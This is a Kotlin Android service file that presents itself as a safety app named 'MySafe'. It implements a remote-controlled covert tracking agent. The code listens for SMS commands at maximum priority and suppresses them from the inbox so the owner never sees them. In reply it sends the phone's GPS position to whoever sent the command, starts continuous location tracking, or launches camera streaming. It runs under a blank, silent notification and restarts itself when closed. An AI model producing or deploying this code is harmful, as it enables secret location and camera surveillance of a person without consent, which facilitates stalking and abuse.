package com.mysafe.mysafe

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.*
import android.telephony.SmsManager
import android.util.Log
import androidx.core.app.NotificationCompat
import java.text.SimpleDateFormat
import java.util.*

class MySafeAgentService : Service() {
    companion object {
        const val TAG = "MySafe_Agent"
        const val ACTION_START = "AGENT_START"
        const val ACTION_STOP = "AGENT_STOP"
        const val CHANNEL_ID = "MySafeAgent"
        
        private var instance: MySafeAgentService? = null
        fun isRunning() = instance != null
    }

    private var lastLocation: Location? = null
    private var lastSentTime = 0L
    private val MIN_DISTANCE_METERS = 10f
    private val MIN_TIME_INTERVAL = 90000L // 1min30s
    private var isTracking = false

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            lastLocation = location
            Log.d(TAG, "📍 Position: ${location.latitude}, ${location.longitude}")
            
            verifierEtEnvoyerPosition(location)
        }
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    private val smsReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action != "android.provider.Telephony.SMS_RECEIVED") return
            context ?: return

            val bundle = intent.extras ?: return
            val pdus = bundle["pdus"] as? Array<*> ?: return

            for (pdu in pdus) {
                val sms = android.telephony.SmsMessage.createFromPdu(pdu as ByteArray)
                val corps = sms.messageBody ?: ""
                val numero = sms.originatingAddress ?: ""

                Log.d(TAG, "📨 De: $numero → $corps")

                when {
                    corps.trim() == "MYSAFE_SEND_POS" -> {
                        Log.d(TAG, "✅ COMMANDE REÇUE — Envoi position...")
                        abortBroadcast() // 🔕 MASQUER LE SMS
                        envoyerPositionParSMS(numero)
                    }
                    corps.trim() == "MYSAFE_START_TRACK" -> {
                        Log.d(TAG, "✅ DÉMARRAGE SUIVI CONTINU")
                        abortBroadcast()
                        demarrerSuiviGPS()
                    }
                    corps.trim() == "MYSAFE_STOP_TRACK" -> {
                        Log.d(TAG, "✅ ARRÊT SUIVI")
                        abortBroadcast()
                        arreterSuiviGPS()
                    }
                    corps.trim() == "MYSAFE_CAMERA_ON" -> {
                        Log.d(TAG, "✅ ALLUMER CAMÉRA")
                        abortBroadcast()
                        demarrerStreaming()
                    }
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        creerNotificationCanal()
        startForeground(1, creerNotificationDiscrete())
        
        // 📩 ENREGISTRER LE RÉCEPTEUR SMS
        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        filter.priority = Int.MAX_VALUE
        registerReceiver(smsReceiver, filter)
        
        Log.d(TAG, "🔒 AGENT CACHÉ DÉMARRÉ — 100% AUTONOME")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> demarrerSuiviGPS()
            ACTION_STOP -> arreterSuiviGPS()
        }
        return START_STICKY // ✅ Redémarre automatiquement si tu le fermes
    }

    private fun demarrerSuiviGPS() {
        if (isTracking) return
        isTracking = true
        
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        try {
            lm.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                MIN_TIME_INTERVAL,
                MIN_DISTANCE_METERS,
                locationListener
            )
            lm.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                MIN_TIME_INTERVAL,
                MIN_DISTANCE_METERS,
                locationListener
            )
            Log.d(TAG, "✅ SUIVI GPS ACTIF — Toutes les 10m / 1min30")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Erreur GPS", e)
        }
    }

    private fun arreterSuiviGPS() {
        isTracking = false
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        lm.removeUpdates(locationListener)
        Log.d(TAG, "✅ SUIVI GPS ARRÊTÉ")
    }

    private fun verifierEtEnvoyerPosition(location: Location) {
        val maintenant = System.currentTimeMillis()
        
        // Envoyer si : 10m parcourus OU 1min30 passée
        if (lastLocation == null) {
            envoyerPositionParSMSATousLesNumeros(location)
            lastSentTime = maintenant
            return
        }

        val distance = location.distanceTo(lastLocation)
        val tempsEcoule = maintenant - lastSentTime

        if (distance >= MIN_DISTANCE_METERS || tempsEcoule >= MIN_TIME_INTERVAL) {
            envoyerPositionParSMSATousLesNumeros(location)
            lastSentTime = maintenant
        }
    }

    private fun envoyerPositionParSMS(destinataire: String) {
        val loc = lastLocation ?: return
        val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        val message = "MYSAFE_POS:${loc.latitude},${loc.longitude},$time"
        
        try {
            SmsManager.getDefault().sendTextMessage(destinataire, null, message, null, null)
            Log.d(TAG, "📤 POSITION ENVOYÉE À $destinataire")
        } catch (e: Exception) {
            try {
                SmsManager.getDefault().sendDataMessage(
                    destinataire, null, 50006.toShort(),
                    message.toByteArray(Charsets.UTF_8), null, null
                )
                Log.d(TAG, "📤 POSITION ENVOYÉE (SMS DONNÉES)")
            } catch (e2: Exception) {
                Log.e(TAG, "❌ ÉCHEC ENVOI", e2)
            }
        }
    }

    private fun envoyerPositionParSMSATousLesNumeros(location: Location) {
        // Ici tu peux stocker plusieurs numéros autorisés
        // Pour l'instant, on ne fait rien — la position est prête quand demandée
        Log.d(TAG, "📍 Position mise à jour: ${location.latitude}, ${location.longitude}")
    }

    private fun demarrerStreaming() {
        val intent = Intent(this, StreamingActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    private fun creerNotificationCanal() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val canal = NotificationChannel(CHANNEL_ID, "MySafe Service", NotificationManager.IMPORTANCE_LOW)
            canal.setShowBadge(false)
            canal.enableVibration(false)
            canal.setSound(null, null)
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(canal)
        }
    }

    private fun creerNotificationDiscrete(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setContentIntent(PendingIntent.getActivity(this, 0, Intent(), PendingIntent.FLAG_IMMUTABLE))
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(smsReceiver)
        arreterSuiviGPS()
        instance = null
        Log.d(TAG, "🔒 AGENT ARRÊTÉ")
    }
}
